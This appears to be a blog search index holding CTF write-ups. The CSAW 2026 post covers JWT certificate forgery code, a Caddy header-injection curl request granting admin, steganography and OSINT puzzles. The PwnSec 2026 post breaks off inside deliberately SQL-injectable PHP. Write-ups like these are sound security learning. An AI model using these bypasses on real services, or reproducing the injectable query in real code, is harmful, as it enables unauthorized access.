<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CSAW CTF Quals 2026</title>
      <link href="/2026/09/22/CSAW-CTF-2026/"/>
      <url>/2026/09/22/CSAW-CTF-2026/</url>
      
        <content type="html"><![CDATA[<p><code>Python</code> · <code>cryptography</code> · <code>pngcheck</code> · <code>exiftool</code> · <code>binwalk</code> · <code>zsteg</code> · <code>SQLite</code> · <code>Pillow</code> · <code>Caddy</code> · <code>FastAPI</code> · <code>curl</code></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>CSAW CTF Quals 2026 covered a lot of ground: JWT forgery, a hidden ZIP inside a PNG, a database reconciliation puzzle, a three-platform OSINT chase, a geolocation challenge, a header-injection bug in a reverse proxy, a history riddle, and a flag sitting in plain sight on the CTF’s own homepage. Eight challenges, four categories.</p><p>Below is all eight, grouped by category and in the order I’d want to read them if I hadn’t solved any of it yet.</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="TrustDinOIDC-JWT-x5c-Forgery-and-Algorithm-Confusion"><a href="#TrustDinOIDC-JWT-x5c-Forgery-and-Algorithm-Confusion" class="headerlink" title="TrustDinOIDC: JWT x5c Forgery and Algorithm Confusion"></a>TrustDinOIDC: JWT <code>x5c</code> Forgery and Algorithm Confusion</h2><p>A portal called <code>trustdinoidc-portal</code> federates login through two OIDC-style providers, <code>strataid.example.com</code> and <code>paleoid.example.com</code>, and carries the session as a JWT cookie. Two gated pages exist: a members-only print and an admins-only print, which is presumably where the flag lives.</p><p><strong>Decoding the token</strong> showed both providers sign with RS256 and embed an <code>x5c</code> field, an X.509 certificate chain, in the header:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;x5c&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;&lt;base64 DER certificate&gt;&quot;</span><span class="punctuation">]</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Loading the leaf certificate with <code>cryptography</code>‘s <code>x509.load_der_x509_certificate</code> turned up something worth noticing: the certificate was self-signed (subject equals issuer), and the chain held only that one certificate, no intermediate or root above it. That’s the usual sign of a verifier that pulls the RSA public key straight out of <code>x5c[0]</code> without checking whether the certificate itself is trusted against a pinned root.</p><p><strong>Method 1: swap the certificate.</strong> If the verifier trusts whatever’s in the header, I can generate my own keypair, self-sign a certificate with the same <code>CN</code>, and sign the JWT with my own key:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = rsa.generate_private_key(public_exponent=<span class="number">65537</span>, key_size=<span class="number">2048</span>)</span><br><span class="line">cert = (x509.CertificateBuilder()</span><br><span class="line">    .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, <span class="string">&quot;strataid.example.com&quot;</span>)]))</span><br><span class="line">    .issuer_name(same)  <span class="comment"># self-signed</span></span><br><span class="line">    .public_key(key.public_key())</span><br><span class="line">    .sign(key, hashes.SHA256()))</span><br></pre></td></tr></table></figure><p>Against StrataID this worked outright: the forged cookie produced a valid logged-in session. Against PaleoID it failed with <code>certificate mismatch</code>, meaning PaleoID actually pins the certificate rather than trusting whatever arrives in the header. One provider hardened, one not.</p><p><strong>Method 2: RS256 to HS256.</strong> Since a legitimate token also exposes the provider’s real public key, the classic follow-up is switching <code>alg</code> to <code>HS256</code> and using the RSA public key bytes as the HMAC secret. I tried it against both providers’ real certificates, in three key encodings, and got <code>The specified alg value is not allowed</code> every time. The app enforces an algorithm allowlist globally, not per-issuer, so that path was closed regardless of which key material I used.</p><p><strong>Escalating the forged token.</strong> With the StrataID bypass confirmed, I edited the payload to <code>sub: admin</code> and set <code>scope</code> to <code>flagosaurus:redeem</code>, guessed by analogy from a legitimately-issued PaleoID token that used <code>freeosaurus:redeem</code> for the member-tier print.</p><p>That forged cookie was the last thing tested before time ran out, and the final response from the admin endpoint wasn’t confirmed. I’m including the writeup anyway because the two bypass attempts and the reasoning behind them are the useful part, even without a flag to show for it.</p><p><strong>Takeaway:</strong> an <code>x5c</code> header is only as trustworthy as whatever chain-of-trust check sits behind it. A verifier that extracts a key from a self-signed, single-entry chain and calls it done is really just trusting the client to say who they are.</p><h2 id="Golf-Heist-Caddy-Forward-Auth-Header-Injection"><a href="#Golf-Heist-Caddy-Forward-Auth-Header-Injection" class="headerlink" title="Golf Heist: Caddy Forward-Auth Header Injection"></a>Golf Heist: Caddy Forward-Auth Header Injection</h2><p>An “Avispa Country Club” site running on FastAPI, with a public page, a members’ collection page, a vault gating a “special item,” and an internal engineer dashboard documenting the site’s own infrastructure. Three decoy <code>/pro-shop</code> endpoints return <code>418 I&#39;m a teapot</code> with hints for an Enigma-style cipher that unlocks a passphrase.</p><p><strong>Collecting the rotor hints.</strong> Each teapot endpoint returns a base64-encoded, zero-padded number in an <code>X-Golf-Hint</code> header, tagged <code>Rotor I</code>, <code>II</code>, or <code>III</code>:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GET</span> /pro-shop/inventory/clubs -&gt; Rotor I</span><br><span class="line"><span class="built_in">GET</span> /pro-shop/inventory/balls -&gt; Rotor II</span><br><span class="line"><span class="built_in">GET</span> /pro-shop/inventory/bags  -&gt; Rotor III</span><br></pre></td></tr></table></figure><p>Stripping the leading zeros gave rotor positions 18, 14, and 15.</p><p><strong>Running the cipher.</strong> The engineer dashboard serves <code>main.py</code> in full, cipher and word lookup included, so this was just execution:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enigma</span>(<span class="params">r1, r2, r3</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">c, w, o</span>): <span class="keyword">return</span> w[(ALPHA.index(c)+o)%<span class="number">26</span>]</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> [<span class="string">&quot;G&quot;</span>,<span class="string">&quot;O&quot;</span>,<span class="string">&quot;L&quot;</span>]:</span><br><span class="line">        c=s; c=f(c,W[<span class="string">&quot;I&quot;</span>],r1%<span class="number">26</span>); c=f(c,W[<span class="string">&quot;II&quot;</span>],r2%<span class="number">26</span>); c=f(c,W[<span class="string">&quot;III&quot;</span>],r3%<span class="number">26</span>)</span><br><span class="line">        c=W[<span class="string">&quot;REF&quot;</span>][ALPHA.index(c)]; c=f(c,W[<span class="string">&quot;III&quot;</span>],(<span class="number">26</span>-r3%<span class="number">26</span>)%<span class="number">26</span>)</span><br><span class="line">        out.append(c)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">enigma(<span class="number">18</span>, <span class="number">14</span>, <span class="number">15</span>)  <span class="comment"># -&gt; [&#x27;W&#x27;, &#x27;O&#x27;, &#x27;H&#x27;]</span></span><br></pre></td></tr></table></figure><p>Indexing the <code>WORDS</code> table with pattern <code>[0, 1, 0]</code> gives the phrase <strong><code>wedge out handicap</code></strong>, which unlocks a “privileged” tier and, inside the response body, a direct pointer to the actual bug:</p><blockquote><p>“The caddy has a known vulnerability. Check GHSA-7r4p-vjf4-gxv4.”</p></blockquote><p><strong>Finding the bypass.</strong> The dashboard exposes the site’s own Caddy config:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:<span class="number">8000</span> &#123;</span><br><span class="line">    forward_auth <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9091</span> &#123;</span><br><span class="line">        uri /auth</span><br><span class="line">        copy_headers <span class="attribute">X</span>-User-Id <span class="attribute">X</span>-User-Role</span><br><span class="line">    &#125;</span><br><span class="line">    reverse_proxy <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9092</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>copy_headers</code> is meant to forward identity headers set by the auth service to the backend, but per the linked advisory, Caddy’s <code>forward_auth</code> doesn’t strip those header names from the original client request first. If the auth service doesn’t overwrite them, a client-supplied <code>X-User-Role</code> sails straight through, and the backend trusts it without question:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">role = req.headers.get(<span class="string">&quot;X-User-Role&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> role.lower() == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;success&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;tier&quot;</span>: <span class="string">&quot;admin&quot;</span>, ..., <span class="string">&quot;flag&quot;</span>: FLAG&#125;</span><br></pre></td></tr></table></figure><p>So the fix, from an attacker’s seat, was to just set the header myself:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST https://&lt;host&gt;/api/vault/admin-item \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-User-Role: admin&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-User-Id: whoever&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;phrase&quot;:&quot;wedge out handicap&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>That returned <code>&quot;tier&quot;: &quot;admin&quot;</code> with the flag attached.</p><p><strong>Takeaway:</strong> <code>copy_headers</code> on a forward-auth proxy only does what its name says: it copies headers from the auth response to the backend. It says nothing about stripping the same header names from the original client request, which means a client can plant a value that survives untouched if the auth service doesn’t happen to overwrite it. Worth checking on any Caddy config using <code>forward_auth</code>.</p><hr><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Hemispheres-PNG-Polyglot-and-LSB-Steganography"><a href="#Hemispheres-PNG-Polyglot-and-LSB-Steganography" class="headerlink" title="Hemispheres: PNG Polyglot and LSB Steganography"></a>Hemispheres: PNG Polyglot and LSB Steganography</h2><p>A single 720×400 PNG, <code>the_signal.png</code>, with a prompt that all but spells out the two-layer structure: something hidden in the file itself, locked, and a key hidden separately in the pixels rather than written down anywhere.</p><p><strong>Structural inspection</strong> with <code>pngcheck -vvv</code> flagged “additional data after IEND chunk.” PNG viewers stop reading at <code>IEND</code>, so anything appended past it is invisible to normal tools while still sitting in the file. <code>exiftool -a -u -g1</code> surfaced a comment confirming exactly that:</p><blockquote><p>“Look past IEND for the lock. The key is in the pixels, not the words.”</p></blockquote><p><strong>Finding the hidden archive</strong> with <code>binwalk</code>:</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">170 </span>     <span class="number">0</span>xAA      Zlib compressed <span class="keyword">data</span>, default compression</span><br><span class="line"><span class="symbol">8286 </span>    <span class="number">0</span>x205E    Zip archive <span class="keyword">data</span>, encrypted, <span class="keyword">name</span>: flag.txt</span><br><span class="line"><span class="symbol">8379 </span>    <span class="number">0</span>x20BB    Zip archive <span class="keyword">data</span>, encrypted, <span class="keyword">name</span>: README.txt</span><br><span class="line"><span class="symbol">8590 </span>    <span class="number">0</span>x218E    <span class="keyword">End</span> of Zip archive</span><br></pre></td></tr></table></figure><p>An encrypted ZIP had been concatenated after the real PNG’s <code>IEND</code> chunk, a standard polyglot. <code>binwalk -e</code> couldn’t pull the encrypted archive out on its own, so I carved it manually:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=the_signal.png of=hidden.zip bs=1 skip=8286 count=326</span><br><span class="line">unzip -l hidden.zip</span><br></pre></td></tr></table></figure><p><strong>Extracting the key</strong> meant sweeping the pixel data rather than the metadata, so I reached for <code>zsteg</code>, which checks every bit-plane, channel, and scan-order combination automatically:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a the_signal.png</span><br></pre></td></tr></table></figure><p>Buried in the noise (repeated characters and spurious signature matches are normal when you’re brute-forcing every plane) was one clean result:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1,<span class="selector-tag">b</span>,lsb,xy .. <span class="selector-tag">text</span>: <span class="string">&quot;r3ad_b3tw33n_th3_p1x3ls&quot;</span></span><br></pre></td></tr></table></figure><p>Bit-plane 1 of the blue channel, LSB-first, row-major order, which is also a direct echo of the challenge’s own “read between the pixels” framing. That string unlocked the archive:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -P <span class="string">&#x27;r3ad_b3tw33n_th3_p1x3ls&#x27;</span> hidden.zip</span><br></pre></td></tr></table></figure><p><strong>Takeaway:</strong> a file that “looks like a perfectly ordinary PNG” to every renderer can still be carrying a second file after <code>IEND</code>, and metadata is worth reading before touching a steganography tool: the hint here told me exactly where not to waste time looking.</p><hr><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Roll-Call-SQLite-Reconciliation"><a href="#Roll-Call-SQLite-Reconciliation" class="headerlink" title="Roll-Call: SQLite Reconciliation"></a>Roll-Call: SQLite Reconciliation</h2><p><code>intake.db</code> is a SQLite case file with five tables: <code>handles</code>, <code>identities</code>, <code>watchlist</code>, <code>escalations</code>, and <code>dm_index</code>. The task is a reconciliation exercise, cross-referencing online handles against real identities and checking where an existing watchlist got it wrong.</p><p><strong>Mapping handles to people.</strong> The <code>identities</code> table already resolves some handle pairs to the same person, collapsing 12 tracked handles down to 10 distinct individuals.</p><p><strong>Comparing against the watchlist,</strong> which held only 8 entries, left a 2-person gap. The trap in this challenge is assuming both belong there without reading further:</p><ul><li><strong>HALCYONLEAKS</strong> turned out to be a genuinely suspicious profile: an account three weeks old, five escalation records, and 25 direct messages sent to investor-relations contacts over two weeks, actively soliciting insider sources. A real gap, and it should have been on the watchlist.</li><li><strong>still_water_77</strong> looked similar on the surface, flagged with an escalation, but the actual content was 41 posts of quiet, grief-toned material concentrated on boards tied to a tragedy. The one escalation attached to this handle was a routine filler phrase, a false positive. This person is correctly absent from the watchlist.</li></ul><p>The flag combines the genuine miss and the correctly-excluded false positive, which is really the point of the challenge: don’t trust the escalation flag without reading what’s actually behind it.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">csaw</span><span class="template-variable">&#123;halcyonleaks_still_water_77&#125;</span></span><br></pre></td></tr></table></figure><h2 id="The-Vantage-Job-A-Chase-Across-Three-Platforms"><a href="#The-Vantage-Job-A-Chase-Across-Three-Platforms" class="headerlink" title="The Vantage Job: A Chase Across Three Platforms"></a>The Vantage Job: A Chase Across Three Platforms</h2><p>A private auction house in Geneva gets robbed of a hardware wallet holding the keys to a dormant 340 BTC wallet. Two files: a PDF “left by the thief” and a short poem. No instance, just a chain of real platforms to work through under the handle “Ferryman.”</p><p><strong>The PDF hides its text as an image.</strong> <code>pdftotext</code> and <code>strings</code> came up empty because the whole page is a single embedded raster image, not a text layer. The pixel values were confined to 252 to 255, rendering as near-invisible pale grey, exactly what the poem in the second file was describing (“paper keeps what paper hides, pale as breath on frosted glass”). A full contrast stretch in Pillow revealed the real text, which read differently at full contrast than at a glance (<strong>bull</strong> became <strong>bot</strong>, <strong>sector</strong> became <strong>secret</strong>):</p><blockquote><p>“A bot has no thumb, no whorls, no line, yet it wears one word as a secret sign… slash the fingerprint, and it’ll know what you mean.”</p></blockquote><p>Translation: find a bot, DM it privately, send the slash command <code>/fingerprint</code>.</p><p><strong>Discord → Instagram → X → a TinyURL.</strong> DMing <code>ferryman_vt</code> on the CSAW Discord and sending <code>/fingerprint</code> returned a reply pointing at a reused username elsewhere. The persona’s Instagram had a poem signed “-X” where the first letter of each line spelled <strong>TOCKFERR</strong>, and the signature pointed at X (Twitter) as the next platform.</p><p>Mapping the follow graph on X did the rest of the work: <code>@ferryman_vt</code> has exactly one follower, <code>@saatviks28</code>, who in turn follows three accounts: <code>tockferr</code>, <code>ferryman_vt</code>, and a new one, <code>@timepieces_ferr</code>, tagged “Geneva.” Its bio held a string that looked like a Pastebin paste ID but was a dead end, and its actual post linked a TinyURL. That resolved to a large base64 string, which decoded to a raw JPEG whose EXIF <code>UserComment</code> field (UTF-16BE, <code>UNICODE</code>-prefixed per the EXIF convention) held the flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">raw = base64.b64decode(b64_string)</span><br><span class="line">idx = raw.find(<span class="string">b&#x27;UNICODE&#x27;</span>)</span><br><span class="line">flag = raw[idx+<span class="number">8</span>:].decode(<span class="string">&#x27;utf-16-be&#x27;</span>)</span><br><span class="line"><span class="comment"># -&gt; &quot;csaw&#123;cr0ss_pl4tf0rm_carel3ssness&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>Dead ends worth naming</strong>, since the challenge had several deliberately shaped like real leads: a Reddit account replying in character to <code>/fingerprint</code> with a 128-character hex string that resisted every hash&#x2F;cipher I threw at it; an “Enter X Number” DM gate that turned out to be an ordinary X privacy feature; a “coordinate” an automated decoder flagged that didn’t reproduce and didn’t fit the story; and two digits hidden in <code>ferryman_vt</code>‘s avatar via bright-pixel isolation that were real but unused in the actual solve.</p><p><strong>Takeaway:</strong> OSINT chases like this one reward reading each piece of “found” content literally before reading it symbolically, and a red herring here was usually shaped exactly like a genuine lead, which is what made ruling each one out worth documenting rather than skipping past.</p><h2 id="High-Tide-Geolocation-from-a-Single-Photo"><a href="#High-Tide-Geolocation-from-a-Single-Photo" class="headerlink" title="High Tide: Geolocation from a Single Photo"></a>High Tide: Geolocation from a Single Photo</h2><p>One image, <code>high_tide.png</code>: a tight crop of a round stone fortification with a French flag flying above it, shot as a Google Maps photo (navigation arrows and watermark visible). No other context.</p><p><strong>The title was the whole clue.</strong> This challenge follows an earlier web challenge in the same CTF built around a gateway hostname called <code>low-tide-lb.ctf.csaw.io</code>. “High Tide” as the sequel name, paired with a French flag and a stone fortification, points at one landmark where the tide itself is the defining feature: Mont Saint-Michel, the tidal island abbey in Normandy known for the speed of its tidal bore.</p><p>Mont Saint-Michel’s ramparts include seven named round towers, and the one in the photo, thick and relatively unadorned, filling most of the frame, best matched Tour Gabriel, documented as the largest tower on the circuit. Since the flag format asked for the name of the place rather than a specific feature, the site-level answer was the one to submit:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">csaw</span><span class="template-variable">&#123;mont_saint_michel&#125;</span></span><br></pre></td></tr></table></figure><p>The more specific <code>csaw{tour_gabriel}</code> was ready as a fallback, but the site-level name was correct on the first try.</p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Comradery-and-Brotherhood-A-History-Riddle"><a href="#Comradery-and-Brotherhood-A-History-Riddle" class="headerlink" title="Comradery and Brotherhood: A History Riddle"></a>Comradery and Brotherhood: A History Riddle</h2><p>No files, no instance, just a riddle:</p><blockquote><p>“Comradery and brotherhood, fighting side by side. All put to an end over a clouded fight. Two men fought, one left distraught. Find the name of the other man.”</p></blockquote><p>The clues that matter: the two men were real allies in actual combat before things went wrong, “clouded fight” is ambiguous between a controversial fight and something literally clouded, the confrontation was personal and one-on-one, and the flag format allows a title, not just a name.</p><p><strong>First guess, and wrong: boxing.</strong> Larry Holmes and Muhammad Ali fit the emotional shape (Holmes called their bond brotherhood, then dominated an ailing Ali in a fight many call one that should never have happened, and wept afterward). Both <code>csaw{muhammad_ali}</code> and <code>csaw{larry_holmes}</code> were rejected, because “fighting side by side” doesn’t actually hold for sparring partners who never fought together against a common opponent.</p><p><strong>Re-reading “clouded” literally,</strong> as wine rather than metaphor, points at Alexander the Great and Cleitus the Black. Cleitus saved Alexander’s life at the Battle of the Granicus, cutting down a Persian noble about to kill him from behind, genuine side-by-side combat. Their bond ended at a banquet in Maracanda where, per Arrian, the wine was “strong and plentiful.” A drunken argument escalated until Alexander grabbed a spear and killed Cleitus on the spot, then spent days refusing food and had to be physically restrained from suicide.</p><p>Alexander is clearly “the one left distraught,” which makes the other man Cleitus, known by his epithet Cleitus the Black, which is exactly what the flag format’s allowance for a “title” was hinting at.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">csaw</span><span class="template-variable">&#123;cleitus_the_black&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Sanity-Check-Hiding-in-Plain-Sight"><a href="#Sanity-Check-Hiding-in-Plain-Sight" class="headerlink" title="Sanity Check: Hiding in Plain Sight"></a>Sanity Check: Hiding in Plain Sight</h2><p>Prompt: “Read the rules, and admire the page!” No files, no instance.</p><p><strong>Dead ends first.</strong> Given how often this CTF hid data in unusual places, I checked the obvious ones: the raw challenge JSON for an unrendered HTML comment (clean), a <code>/rules</code> or <code>/page/rules</code> route on the platform (both 404), and a commented-out <code>stars.webp</code> background image found via view-source. That last one got a full pass, RIFF chunk parsing for trailing data, a pixel-histogram check for a suspicious value band, heavy downsampling for a hidden watermark, and it came back clean on every axis. Genuine red herring, reusing a “hide it in the media” motif that paid off elsewhere in this CTF specifically to bait that investigation here.</p><p><strong>The actual solve</strong> was in the Discord rules text, where one line stands out as grammatically odd for a moderation policy:</p><blockquote><p>“DMing a moderator&#x2F;organizer will get your question ignored and swap <code>heist_completed</code> to <code>heist_started</code>.”</p></blockquote><p>Nothing about DMing a moderator would plausibly swap anything, which is the tell that it’s a planted instruction. Separately, the CTFd homepage (not <code>/challenges</code>, which doesn’t render this section) has a themed hero banner:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crew<span class="variable">@vault</span><span class="symbol">:~</span><span class="variable">$ </span>./crack --target mainframe &amp;&amp; cat csaw&#123;heist_completed&#125;</span><br></pre></td></tr></table></figure><p>That’s “admire the page,” but it’s the bait version. The Discord line is the actual instruction: take the visible string and swap <code>heist_completed</code> for <code>heist_started</code>.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">csaw</span><span class="template-variable">&#123;heist_started&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Takeaway:</strong> the two halves of the hint, “read the rules” and “admire the page,” were never separate leads pointing at separate flags. They were one instruction split across two places on the platform, and neither half means anything without the other.</p><hr><h2 id="Closing-Thoughts"><a href="#Closing-Thoughts" class="headerlink" title="Closing Thoughts"></a>Closing Thoughts</h2><p>Eight challenges, and the pattern across most of them was the same: don’t trust the first thing you find, and read what’s actually in front of you instead of what a tool tells you should be there. Golf Heist handed over its own vulnerable config in an “engineer dashboard” and named the CVE outright, but the fix still meant reading <code>copy_headers</code> closely enough to notice what it doesn’t do. Hemispheres and The Vantage Job both hid real content behind near-invisible pixel values, and both told you exactly where to look if you read the accompanying text instead of skipping straight to the file. Sanity Check’s two-part hint and TrustDinOIDC’s two providers with two different security postures made the same point from opposite directions: the interesting part of a system is rarely the part that behaves the same everywhere.</p><p>TrustDinOIDC is the one loose end. The StrataID bypass worked, and the forged admin token was sent, but I didn’t get confirmation back before time ran out. I’m leaving it in as written rather than filling in an ending that didn’t happen.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Forensics </tag>
            
            <tag> OSINT </tag>
            
            <tag> Misc </tag>
            
            <tag> JWT </tag>
            
            <tag> Steganography </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnSec CTF 2026</title>
      <link href="/2026/09/16/PwnSec-CTF-2026/"/>
      <url>/2026/09/16/PwnSec-CTF-2026/</url>
      
        <content type="html"><![CDATA[<p><code>PHP</code> · <code>MySQL</code> · <code>mysqli</code> · <code>Python 3.12</code> · <code>Flask</code> · <code>pickle</code> · <code>pickletools</code> · <code>curl</code> · <code>requests</code> · <code>sqlmap</code></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>PwnSec CTF 26 ran on September 12th under a “Humans vs Cyborgs” banner at <a href="https://pwnsec.ctf.ae/">pwnsec.ctf.ae</a>. I came out of it with two flags, both from easy web challenges. That’s the whole scoreboard story on my end, and I’d rather write it down than pretend otherwise.</p><p>The two solves were worth writing up anyway, because neither one fell to a standard payload. <strong>Slop Slop Go Away</strong> was a SQL injection where every classic channel was deliberately sealed off and the actual oracle turned out to live in the PHP, not the SQL. <strong>Time Capsule</strong> was a pickle deserialization challenge wrapped in three separate filters, where the way through was an opcode most people forget exists.</p><p>Both writeups below are the full thing, exactly as I worked them.</p><span id="more"></span><hr><h1 id="Challenge-1-Slop-Slop-Go-Away"><a href="#Challenge-1-Slop-Slop-Go-Away" class="headerlink" title="Challenge 1: Slop Slop Go Away"></a>Challenge 1: Slop Slop Go Away</h1><blockquote><p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>Category</strong>: <span style="color:#9fef00">Web</span></p></blockquote><p>The challenge statement was a nursery rhyme, credited to “Fat Mesh”:</p><blockquote><p>slop slop go away<br>Come again another day<br>Be the person that you fear<br>Slop slop go away</p></blockquote><h2 id="1-The-source-code"><a href="#1-The-source-code" class="headerlink" title="1. The source code"></a>1. The source code</h2><p>Visiting the URL directly dumps the PHP source:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$START</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(function () <span class="keyword">use</span> ($<span class="title">START</span>) &#123;</span><br><span class="line">    $<span class="title">remaining</span> = 2.0 - (<span class="title">microtime</span>(<span class="title">true</span>) - $<span class="title">START</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$remaining</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>((<span class="keyword">int</span>)(<span class="variable">$remaining</span> * <span class="number">1000000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;); <span class="comment">// no timing attack!!</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_report</span>(MYSQLI_REPORT_OFF);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;chall&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT username FROM users WHERE id = &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ill try to tell him, dw&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">    <span 